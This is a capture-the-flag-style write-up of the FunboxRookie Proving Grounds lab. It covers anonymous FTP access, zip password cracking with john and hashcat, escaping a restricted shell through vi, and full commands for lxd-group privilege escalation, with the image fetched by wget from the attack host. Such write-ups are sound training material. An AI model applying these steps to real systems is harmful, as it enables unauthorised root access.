---
tags: lxd, ftp, hashcat, zip2john, john, rbash
---
## Offsec PG: FunboxRookie

***Overview:** FunboxRookie is a Linux machine on Offensive Security Proving Grounds rated as easy, this machine uses anonymous login to an ftp server to gain files which identity files can be extracted from to gain access and then exploit access to the lxd group to escalate privileges to root.*

#### Enumeration
- I firstly go the page and its a regular Apache default page, so I scan for open ports and services `nmap -sV -sC -T4 192.168.243.107`

![](/assets/FunboxRookie_assets/Pasted%20image%2020221015163311.png)

- then i scan for directories using ffuf `ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -u http://192.168.243.107/FUZZ` but i find none

![](/assets/FunboxRookie_assets/Pasted%20image%2020221015170447.png)
- from the the nmap scan i see that i can access the FTP server via anonymous login, then notice some zip files

![](/assets/FunboxRookie_assets/Pasted%20image%2020221015163607.png)

- i download these zip files using `mget *.zip`  and `get welcome.msg` to get all the zip files from ftp

![](/assets/FunboxRookie_assets/Pasted%20image%2020221015191731.png)

- viewing the welcome.msg but do not get any useful information

![](/assets/FunboxRookie_assets/Pasted%20image%2020221015191746.png)

- viewing the robots.txt directory and i see the logs directory

![](/assets/FunboxRookie_assets/Pasted%20image%2020221015164856.png)

- then going to the logs directory, we will get a 404 error

![](/assets/FunboxRookie_assets/Pasted%20image%2020221015191526.png)

- so see i don't have the password for any of the zip files, i firstly convert the zip files into hashes and save them in a file `zip2john anna.zip  ariel.zip  bud.zip  cathrine.zip  homer.zip  jessica.zip  john.zip  marge.zip  miriam.zip  tom.zip  zlatan.zip >> hashes`

![](/assets/FunboxRookie_assets/Pasted%20image%2020221015172543.png)

- i then use john to crack the hashes `john hashes ` and i got the password for 2 zip files which are cathrine.zip and tom.zip

![](/assets/FunboxRookie_assets/Pasted%20image%2020221015172647.png)

 - I also used hashcat to crack the hashes following this video [https://www.youtube.com/watch?v=IHoH05IMBe4](https://www.youtube.com/watch?v=IHoH05IMBe4) using  the syntax` hashcat -a 0 -m 17200 hashes.txt /usr/share/wordlists/rockyou.txt`

![](/assets/FunboxRookie_assets/Pasted%20image%2020221015175501.png)

-  so i then open the zip files using `7z x tom.zip` and enter the password as iubire and `7z x cathrine.zip ` with the password as catwoman and get the id_rsa files
#### Foothold
- I tried to ssh to cathrine user with the identity file but the connection gets closed

  ![](/assets/FunboxRookie_assets/Pasted%20image%2020221015191417.png)
  
- i tried accessing tom and it worked  `ssh tom@192.168.237.107 -i tom_id_rsa` so i got foothold

  ![](/assets/FunboxRookie_assets/Pasted%20image%2020221015182445.png)
  
- i found the first flag in the home directory

![](/assets//assets/FunboxRookie_assets/Pasted%20image%2020221015183247.png)

#### Privilege Escalation
- so i tried searching for SUID files but i realised i was in a restricted shell

![](/assets/FunboxRookie_assets/Pasted%20image%2020221015182700.png)

- so using running `vi local.txt` and running the commands bellow, i break out of the shell
```text
:set shell=/bin/bash
:shell
```
![](/assets/FunboxRookie_assets/Pasted%20image%2020221015182927.png)

- I ran linpeas script to check for privilege escalation vectors and saw that the current user is part of the sudo group and lxd group, i then verified bye running the id command

![](/assets/FunboxRookie_assets/Pasted%20image%2020221015191258.png)

![](/assets/FunboxRookie_assets/Pasted%20image%2020221015191152.png)

- since i don't have the password of the current user i can't run the sudo command to escalate privileges, so i focus on the lxd group instead
- following the guide in this link, i was able to exploit the lxd group ang gain root access
[https://www.hackingarticles.in/lxd-privilege-escalation/](https://www.hackingarticles.in/lxd-privilege-escalation/)
- so on my attack machine, i ran the following commands
```text
- git clone  https://github.com/saghul/lxd-alpine-builder.git
- sudo ./build-alpine
- python3 -m http.server 80 # to host the file
```
- then on the vulnerable machine i get the file and run the remaining commands
```text
- wget http://192.168.49.166/alpine-v3.13-x86_64-20210218_0139.tar.gz
- lxc image import ./alpine-v3.13-x86_64-20210218_0139.tar.gz --alias myimage
- lxc image list
- lxd init
- lxc init myimage ignite -c security.privileged=true
- lxc config device add ignite mydevice disk source=/ path=/mnt/root recursive=true
- lxc start ignite
- lxc exec ignite /bin/sh
```
- and i finally get root access

![](/assets/FunboxRookie_assets/Pasted%20image%2020221015190520.png)
- then going to the `/mnt/root/root` directory i was able to get the root flag

![](/assets/FunboxRookie_assets/Pasted%20image%2020221015191057.png)

Thanks for reading my writeup, see you next time :).

